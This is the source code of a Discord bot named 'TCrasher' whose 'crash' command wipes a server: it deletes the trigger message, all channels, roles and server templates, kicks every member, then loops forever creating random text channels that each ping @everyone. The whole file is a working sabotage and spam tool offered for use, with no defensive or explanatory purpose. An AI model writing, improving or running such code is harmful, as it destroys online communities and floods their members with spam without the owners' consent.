import colorama, discord, json
from discord.ext import commands
from python_random_strings import random_strings as rnd

colorama.init()

with open("auth.json", "r") as f:
    data = json.load(f)


intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=data['prefix'], intents=intents, help_command=None)

@bot.event
async def on_ready():
    print(colorama.Fore.CYAN + f"\nTCrasher loaded successfully. | ID: {bot.user.id}")

@bot.command()
async def crash(ctx):
    await ctx.message.delete()
    a = ""
    guild = ctx.message.guild
    try:
        for channel in guild.channels:
            await channel.delete() 
    except:
        print(colorama.Fore.RED + f"[-] Cannot delete channel {channel.name}")
    
    try:
        for role in guild.roles:
            await role.delete()
    except:
        print(colorama.Fore.RED + f"[-] Cannot delete role {role.name}")

    try: 
        for template in await guild.templates:
            await template.delete()
    except:
        print(colorama.Fore.RED + f"[-] Cannot delete server templates")
    
    try:
        for cheese in ctx.guild.members:
            await cheese.kick(reason=None)
            print(colorama.Fore.GREEN + f"[+] Kicked {cheese.name}")
    except:
        print(colorama.Fore.RED + f"[-] Cannot kick {cheese.name}")

    while True:
        a = rnd.random_lowercase(10)
        await guild.create_text_channel(a)
        channel = discord.utils.get(guild.channels, name=a)
        channel_id = channel.id
        output = bot.get_channel(channel_id)
        await output.send("@everyone")
    

bot.run(data['token'])